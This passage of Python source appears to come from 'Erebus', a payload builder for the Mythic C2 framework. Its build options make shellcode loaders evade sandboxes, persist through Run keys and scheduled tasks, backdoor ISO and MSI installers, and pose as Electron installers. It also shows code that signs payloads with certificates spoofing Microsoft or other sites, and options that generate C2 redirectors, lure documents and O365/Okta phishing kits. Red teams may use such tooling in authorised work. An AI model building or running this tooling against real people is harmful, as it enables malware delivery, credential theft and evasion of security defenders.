            default_value = True,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9g Hostname Whitelist",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = (
                "Comma-separated list of hostnames (or suffixes) that are ALLOWED "
                "to run the installer. Empty = no whitelist check."
            ),
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9h Hostname Blocklist",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = (
                "Comma-separated list of hostnames that are BLOCKED from running "
                "the installer. Empty = no blocklist check."
            ),
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9i Username Whitelist",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed usernames. Empty = no whitelist check.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9j Username Blocklist",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked usernames. Empty = no blocklist check.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9k Min Screen Width",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = (
                "Refuse to stage if the primary display's width is less than this "
                "many pixels. Sandboxes commonly run at 800x600 or 1024x768. "
                "0 disables the check."
            ),
            default_value = "1280",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9l Min Screen Height",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Refuse to stage if the primary display's height is less than this many pixels. 0 disables the check.",
            default_value = "720",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9m Min CPU Count",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Refuse to stage if the host has fewer than N logical CPUs (most sandbox VMs use 1-2). 0 disables.",
            default_value = "2",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9n Min Memory (MB)",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Refuse to stage if the host has less than N MB of RAM. 0 disables.",
            default_value = "2048",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9o Max Idle Seconds",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = "Refuse to stage if the system idle time is greater than this many seconds (unattended box = suspicious). 0 disables.",
            default_value = "0",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9p Pre-Spawn Delay (ms)",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = (
                "Sleep this many ms inside the Install handler AFTER every other "
                "guardrail has passed, before the file copy and spawn. Forces "
                "short-lived sandbox detonation windows to time out before "
                "anything hits disk. 0 disables."
            ),
            default_value = "0",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.E9q Guardrail Debug Mode",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "TESTING ONLY. When True, guardrail failures are surfaced visibly: "
                "failure reasons are logged to the Electron console AND displayed "
                "as a red banner inside the wizard instead of silently advancing to "
                "Finish. Also logs which check blocked the install. NEVER SHIP WITH "
                "THIS ENABLED - it defeats the silent-failure property that makes "
                "sandbox detonations look like successful installs."
            ),
            default_value = False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.E9 Enable Electron Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="3.1 Compression Level",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.ChooseOne,
            description="Select compression level (9 is max).",
            choices=["0", "1", "3", "5", "7", "9"],
            default_value="9",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="VHD"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="Electron"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="AppInstaller"),
            ]
        ),

        BuildParameter(
            name="3.2 Archive Password",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="Optional password for the archive (leave empty for none).",
            default_value="",
            required=False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="ISO"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="VHD"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="Electron"),
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="AppInstaller"),

            ]
        ),

        # Electron persistence parameters
        BuildParameter(
            name = "3.P0 Enable Persistence",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Copy the loader to a permanent location and register a persistence mechanism "
                "so it survives reboot. The copy is made BEFORE the loader is spawned.\n\n"
                "Supported methods (select via 3.P1):\n"
                "  Registry Run Key   - HKCU\\...\\Run (every login)\n"
                "  Registry RunOnce   - HKCU\\...\\RunOnce (next login only)\n"
                "  Startup Folder     - %APPDATA%\\...\\Startup\\\n"
                "  Scheduled Task     - schtasks /sc onlogon /rl limited"
            ),
            default_value = False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
            ]
        ),
        BuildParameter(
            name = "3.P1 Persistence Method",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Persistence mechanism to register after install:\n"
                "  Registry Run Key   - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n"
                "  Registry RunOnce   - same key but RunOnce (single invocation)\n"
                "  Startup Folder     - copies loader/BAT wrapper to shell:startup\n"
                "  Scheduled Task     - schtasks /create /sc onlogon /rl limited"
            ),
            choices = ["Registry Run Key", "Registry RunOnce", "Startup Folder", "Scheduled Task"],
            default_value = "Registry Run Key",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.P0 Enable Persistence", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.P2 Persistence Name",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.String,
            description = (
                "Registry value name, scheduled task name, and install subdirectory name "
                "used for the persisted entry. Defaults to the Electron product name when empty."
            ),
            default_value = "",
            required = False,
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.P0 Enable Persistence", operand=HideConditionOperand.EQ, value=False),
            ]
        ),
        BuildParameter(
            name = "3.P3 Persistence Install Dir",
            group_name="16 - Containers",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Base directory where the loader is copied before persistence is registered.\n"
                "  %APPDATA%      - C:\\Users\\<user>\\AppData\\Roaming\\<name>\\\n"
                "  %LOCALAPPDATA% - C:\\Users\\<user>\\AppData\\Local\\<name>\\"
            ),
            choices = ["%APPDATA%", "%LOCALAPPDATA%"],
            default_value = "%APPDATA%",
            hide_conditions = [
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="Electron"),
                HideCondition(name="3.P0 Enable Persistence", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        #ISO
        BuildParameter(
            name="4.0 ISO Volume ID",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="ISO Volume name seen in Explorer.",
            default_value="EREBUS",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.1 ISO enable Autorun",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.Boolean,
            description="Enable Autorun for ISO",
            default_value=False,
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),

        BuildParameter(
            name="4.2 ISO Backdoor File",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing ISO",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="ISO")
            ]
        ),
        BuildParameter(
            name="5.0 MSI Product Name",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="Application name shown in MSI/UI",
            default_value="System Updater",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.1 MSI Manufacturer",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="Company name shown in MSI metadata",
            default_value="Microsoft Corporation",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.2 MSI Install Scope",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.ChooseOne,
            description="Machine=Admin Required (Program Files), User=No Admin (AppData)",
            choices=["User", "Machine"],
            default_value="User",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.NotEQ, value="MSI")
            ]
        ),

        BuildParameter(
            name="5.3 Enable MSI Backdoor",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.Boolean,
            description="Enable backdoor functionality for MSI installer",
            default_value=False,
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI")
            ]
        ),
        BuildParameter(
            name="5.4 MSI Backdoor File",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.File,
            description="Backdoor an existing MSI installer by injecting payload execution",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.5 MSI Attack Type",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.ChooseOne,
            description="""Attack vector for MSI backdoor injection:
- execute: Run command via CustomAction (stealthiest)
- run-exe: Extract and execute EXE from Binary table
- load-dll: Load native DLL via DllEntry
- dotnet: Load .NET assembly (auto-detected)
- script: Execute VBScript/JScript (requires entry point)""",
            choices=["execute", "run-exe", "load-dll", "dotnet", "script"],
            default_value="execute",
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.6 MSI Entry Point",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="DLL export function or script function name (required for load-dll/dotnet/script attacks)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.EQ, value="execute"),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.EQ, value="run-exe"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.7 MSI Command Arguments",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="Command line arguments for execute/run-exe attacks",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="execute"),
                HideCondition(name="5.5 MSI Attack Type", operand=HideConditionOperand.NotEQ, value="run-exe"),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.8 MSI Execution Condition",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="MSI condition for payload execution (default: NOT REMOVE = run on install only)",
            default_value="NOT REMOVE",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        BuildParameter(
            name="5.9 MSI Custom Action Name",
            group_name="16 - Containers",
            parameter_type=BuildParameterType.String,
            description="Custom action name (leave empty for random generation)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="3.0 Container Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="5.4 MSI Backdoor File", operand=HideConditionOperand.EQ, value=""),
                HideCondition(name="5.3 Enable MSI Backdoor", operand=HideConditionOperand.EQ, value=False)
            ]
        ),
        #Codesigning
        BuildParameter(
            name="6.0 Codesign Loader",
            group_name="17 - Codesigning",
            parameter_type=BuildParameterType.Boolean,
            description="Sign the loader with a code signing cert",
            required=False,
            hide_conditions = [
                HideCondition(name="0.3 Loader Build Configuration", operand=HideConditionOperand.EQ, value="test"),
            ]
        ),

        BuildParameter(
            name="6.1 Codesign Type",
            group_name="17 - Codesigning",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose how you want to sign the payload",
            choices=["SelfSign", "Spoof URL", "Provide Certificate"],
            required=False,
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False)
            ]
        ),

        BuildParameter(
            name="6.2 Codesign CN",
            group_name="17 - Codesigning",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Common Name (CN) for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.3 Codesign Orgname",
            group_name="17 - Codesigning",
            parameter_type=BuildParameterType.String,
            default_value="Microsoft Corporation",
            description="Organisation Name for self-signed cert",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value=False),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="SelfSign")
            ]
        ),

        BuildParameter(
            name="6.4 Codesign Spoof URL",
            group_name="17 - Codesigning",
            parameter_type=BuildParameterType.String,
            default_value="www.google.com",
            description="URL to clone certificate details from",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Spoof URL")
            ]
        ),

        BuildParameter(
            name="6.5 Codesign Cert",
            group_name="17 - Codesigning",
            parameter_type=BuildParameterType.File,
            description="Upload PFX/P12 certificate",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),
        BuildParameter(
            name="6.6 Codesign Cert Password",
            group_name="17 - Codesigning",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Certificate password (leave empty if none)",
            hide_conditions=[
                HideCondition(name="6.0 Codesign Loader", operand=HideConditionOperand.EQ, value="False"),
                HideCondition(name="6.1 Codesign Type", operand=HideConditionOperand.NotEQ, value="Provide Certificate")
            ]
        ),

        # ── Redirector Config Generator ───────────────────────────────────────
        BuildParameter(
            name="7.0 Generate Redirector Configs",
            group_name="18 - Redirector",
            parameter_type=BuildParameterType.Boolean,
            description=(
                "Generate C2 redirector configs (Apache .htaccess, Nginx block, Caddyfile, Terraform stub) "
                "matching the C2 profile. Output is bundled into the final artifact ZIP alongside the payload."
            ),
            default_value=False,
            required=False,
        ),

        BuildParameter(
            name="7.1 Redirector Team Server URL",
            group_name="18 - Redirector",
            parameter_type=BuildParameterType.String,
            description="Full URL of the hidden team server (e.g. https://10.0.0.5:8443). Never exposed to the public.",
            default_value="https://10.0.0.5:8443",
            required=False,
            hide_conditions=[
                HideCondition(name="7.0 Generate Redirector Configs", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="7.2 Redirector Public Domain",
            group_name="18 - Redirector",
            parameter_type=BuildParameterType.String,
            description="Public hostname of the redirector (e.g. cdn.legitimate-looking.com). Used in Nginx/Caddy configs.",
            default_value="cdn.example.com",
            required=False,
            hide_conditions=[
                HideCondition(name="7.0 Generate Redirector Configs", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="7.3 Redirector Decoy URL",
            group_name="18 - Redirector",
            parameter_type=BuildParameterType.String,
            description="Catch-all 302 target for non-matching traffic. Pick a plausible site matching the redirector domain theme.",
            default_value="https://www.microsoft.com/en-us/",
            required=False,
            hide_conditions=[
                HideCondition(name="7.0 Generate Redirector Configs", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        # ── Decoy Document Generator ──────────────────────────────────────────
        BuildParameter(
            name="8.0 Generate Decoy Document",
            group_name="13 - Decoy",
            parameter_type=BuildParameterType.Boolean,
            description=(
                "Generate a lure document (DOCX/XLSX) placed alongside the payload. "
                "Open this file in the loader's background thread to display plausible content to the victim."
            ),
            default_value=False,
            required=False,
        ),

        BuildParameter(
            name="8.1 Decoy Template",
            group_name="13 - Decoy",
            parameter_type=BuildParameterType.ChooseOne,
            description="Lure document theme: invoice, hr_policy, job_offer, it_notice, nda",
            choices=["invoice", "hr_policy", "job_offer", "it_notice", "nda"],
            default_value="invoice",
            required=False,
            hide_conditions=[
                HideCondition(name="8.0 Generate Decoy Document", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="8.2 Decoy Company Name",
            group_name="13 - Decoy",
            parameter_type=BuildParameterType.String,
            description="Company name shown in the decoy document header / letterhead.",
            default_value="Acme Corporation",
            required=False,
            hide_conditions=[
                HideCondition(name="8.0 Generate Decoy Document", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="8.3 Decoy Recipient",
            group_name="13 - Decoy",
            parameter_type=BuildParameterType.String,
            description="Addressee name used in salutations and 'Bill To' fields.",
            default_value="Valued Employee",
            required=False,
            hide_conditions=[
                HideCondition(name="8.0 Generate Decoy Document", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="8.4 Decoy Format",
            group_name="13 - Decoy",
            parameter_type=BuildParameterType.ChooseOne,
            description="Output format for the decoy document (xlsx only available for invoice template).",
            choices=["docx", "xlsx"],
            default_value="docx",
            required=False,
            hide_conditions=[
                HideCondition(name="8.0 Generate Decoy Document", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        # ── Phishing Page Generator ───────────────────────────────────────────
        BuildParameter(
            name="9.0 Generate Phishing Page",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.Boolean,
            description=(
                "Generate a phishing page kit (HTML + PHP/Python capture backend) "
                "bundled into the final artifact ZIP."
            ),
            default_value=False,
            required=False,
        ),

        BuildParameter(
            name="9.1 Phishing Template",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.ChooseOne,
            description="Portal to spoof: o365, sharepoint, docusign, adfs, okta",
            choices=["o365", "sharepoint", "docusign", "adfs", "okta"],
            default_value="o365",
            required=False,
            hide_conditions=[
                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="9.2 Phishing Org Name",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Organization name shown in the phishing page header.",
            default_value="Acme Corporation",
            required=False,
            hide_conditions=[
                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="9.3 Phishing Domain",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Email domain shown as placeholder in login forms (e.g. acme.com).",
            default_value="acme.com",
            required=False,
            hide_conditions=[
                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="9.4 Phishing Redirect URL",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="URL to redirect victim to after credential capture (e.g. the real O365 portal).",
            default_value="https://www.office.com",
            required=False,
            hide_conditions=[
                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name="9.5 GoPhish Webhook",
            group_name="11 - Triggers",
            parameter_type=BuildParameterType.String,
            description="Optional GoPhish campaign webhook URL. Captured credentials are also POSTed here.",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="9.0 Generate Phishing Page", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

]

    build_steps = [
        BuildStep(step_name = "[T1005] - Gathering Files",
                  step_description = "Copy files to temporary location"),

        BuildStep(step_name = "[T1027] - Header Check",
                  step_description = "Check file for MZ Header"),

        BuildStep(step_name = "[T1027] - Shellcode Obfuscation",
                  step_description = "Obfuscating shellcode based on selected options"),

        BuildStep(step_name = "[T1518] - Gathering DLL Exports for Hijacking",
                  step_description = "Extracts exports from the uploaded DLL to be used for proxying"),

        BuildStep(step_name = "[T1027.011] - Compiling DLL Payload",
                  step_description = "Compiling DLL Payload with Hijacked Info & Obfuscated Shellcode"),

        BuildStep(step_name = "[T1027] - Compiling Shellcode Loader",
            step_description = "Compiling Shellcode Loader"),

        BuildStep(step_name = "[T1608.001] - Wrapping Payload in Electron Installer",
                  step_description = "Packaging the compiled loader inside a fake Electron NSIS installer (npm + electron-builder)."),

        BuildStep(step_name = "[T1027] - Compiling ClickOnce Loader",
            step_description = "Compiling ClickOnce Loader"),

        BuildStep(step_name = "[T1553.006] - Sign Shellcode Loader",
            step_description = "Signing the Shellcode Loader with a code signing certificate"),

        BuildStep(step_name = "[T1566.001] - Creating MalDoc",
                  step_description = "Creating or backdooring Excel document with VBA payload"),

        BuildStep(step_name = "[T1137.006] - Adding Trigger",
                  step_description = "Creating trigger to execute given payload"),

        BuildStep(step_name = "[T1218.007] - Staging MSI",
                  step_description = "Staging uploaded MSI for backdoor injection"),

        BuildStep(step_name = "[T1036.008] - Creating Decoy",
                  step_description= "Creating a placeholder decoy file"),

        BuildStep(step_name = "[T1027] - Containerising",
                  step_description = "Adding payload into chosen container"),

        BuildStep(step_name = "[T1090.002] - Redirector Configs",
                  step_description = "Generating Apache/Nginx/Caddy/Terraform redirector configs"),

        BuildStep(step_name = "[T1566.001] - Decoy Document",
                  step_description = "Generating branded lure document for victim display"),

        BuildStep(step_name = "[T1566.002] - Phishing Kit",
                  step_description = "Generating phishing page kit with credential capture backend"),
    ]

    def calculate_sha256(self, file_path: str) -> str:
        """Calculate SHA256 hash of a file"""
        sha256_hash = hashlib.sha256()
        with open(file_path, "rb") as f:
            for byte_block in iter(lambda: f.read(4096), b""):
                sha256_hash.update(byte_block)
        return sha256_hash.hexdigest()

    async def _build_step(self, name: str, stdout: str, success: bool = True) -> None:
        """Send a build-step update to Mythic.

        Wraps the SendMythicRPCPayloadUpdatebuildStep boilerplate. Used at
        every phase boundary in build() so the orchestration reads at the
        phase level instead of at the RPC level.
        """
        await SendMythicRPCPayloadUpdatebuildStep(
            MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName=name,
                StepStdout=stdout,
                StepSuccess=success,
            )
        )

    async def _apply_codesign(self, agent_build_path, dll_file_name, response) -> bool:
        """Dispatch code signing based on the configured signing mode.

        Returns True on success (or when signing is disabled), False on
        any failure - the caller is expected to early-return `response`
        on False so the error build_stderr/build_step propagates.

        Modes (parameter "6.1 Codesign Type"):
          - SelfSign: fresh self-generated cert with operator-supplied CN/Org.
          - Spoof URL: fetch a real cert's public fields from a target URL
            via get_remote_cert_details() and self-sign with them - produces
            a cert that *looks* like the legitimate one to cursory
            inspection but is not actually chained to a trusted CA.
          - Provide Certificate: operator uploads a .pfx via Mythic; we
            fetch its bytes and call osslsigncode with the supplied pass.
        """
        if not self.get_parameter("6.0 Codesign Loader"):
            return True

        try:
            main_type = self.get_parameter("0.0 Main Payload Type")
            loader_type = self.get_parameter("0.1 Loader Type")
            if main_type == "Loader":
                if loader_type == "ClickOnce":
                    payload_path = Path(agent_build_path) / "payload" / "erebus.exe"
                else:
                    payload_path = Path(agent_build_path) / "payload" / f"erebus.{self.get_parameter('0.2 Loader Format')}"
            elif main_type == "Hijack":
                payload_path = Path(agent_build_path) / "payload" / dll_file_name
            else:
                raise ValueError("Unsupported payload type for code signing")

            if not payload_path.exists():
                raise FileNotFoundError(f"Payload not found for signing at: {payload_path}")

            signing_type = self.get_parameter("6.1 Codesign Type")

            if signing_type == "SelfSign":
                cn = self.get_parameter("6.2 Codesign CN")
                org = self.get_parameter("6.3 Codesign Orgname") or cn
                self_sign_payload(
                    payload_path=payload_path,
                    subject_cn=cn,
                    org_name=org,
                )
                success_msg = f"Self-signed with CN: {cn}"

            elif signing_type == "Spoof URL":
                target_url = self.get_parameter("6.4 Codesign Spoof URL")
                if not target_url:
                    raise ValueError("No URL provided for spoofing")
                cert_details = get_remote_cert_details(target_url)
                self_sign_payload(
                    payload_path=payload_path,
                    subject_cn=cert_details["CN"],
                    org_name=cert_details["O"],
                    full_details=cert_details,
                )
                success_msg = f"Spoofed {target_url} (CN: {cert_details['CN']})"

            elif signing_type == "Provide Certificate":
                cert_uuid = self.get_parameter("6.5 Codesign Cert")
                cert_pass = self.get_parameter("6.6 Codesign Cert Password")
                if not cert_uuid:
                    raise ValueError("No certificate file uploaded")
                file_resp = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=cert_uuid)
                )
                if not file_resp.Success:
                    raise ValueError("Failed to retrieve certificate file")
                cert_path = Path(agent_build_path) / "uploaded_cert.pfx"
                cert_path.write_bytes(file_resp.Content)
                sign_with_provided_cert(
                    payload_path=payload_path,
                    cert_path=cert_path,
                    cert_password=cert_pass,
                )
                success_msg = "Signed with provided certificate"

            else:
                raise ValueError(f"Unknown signing_type: {signing_type!r}")

            await self._build_step("[T1553.006] - Sign Shellcode Loader", f"Success: {success_msg}", success=True)
            return True

        except Exception as e:
            await self._build_step("[T1553.006] - Sign Shellcode Loader", f"Signing Failed: {str(e)}", success=False)
            response.status = BuildStatus.Error
            response.build_stderr = f"Code signing failed: {str(e)}"
            return False

    async def _fail_step(
        self,
        response,
        step_name: str,
        stderr: str,
        step_stdout: str,
    ) -> None:
        """Populate an error BuildResponse and emit a failed build step.

        Consolidates the 4-line `response.status = BuildStatus.Error /
        response.build_stderr = ... / await self._build_step(..., False) /
        return response` pattern that appeared at 8+ phase-failure sites
        in build() before the R3c refactor. Callers still issue `return
        response` after the await so the control flow stays visible at
        the call site (the helper cannot raise/return-for-you without
        hiding the control-flow edge).
        """
        response.status = BuildStatus.Error
        response.build_stderr = stderr
        await self._build_step(step_name, step_stdout, success=False)

    def add_to_iocs(self, iocs_list: list, file_path: str, timestamp: str = None) -> None:
        """Add a file's hash to IOCs list"""
        if timestamp is None:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        try:
            if os.path.exists(file_path):
                sha256 = self.calculate_sha256(file_path)
                filename = os.path.basename(file_path)
                iocs_list.append({
                    'timestamp': timestamp,
                    'filename': filename,
                    'sha256': sha256,
                    'full_path': file_path
                })
        except Exception as e:
            print(f"[!] Failed to calculate hash for {file_path}: {str(e)}")

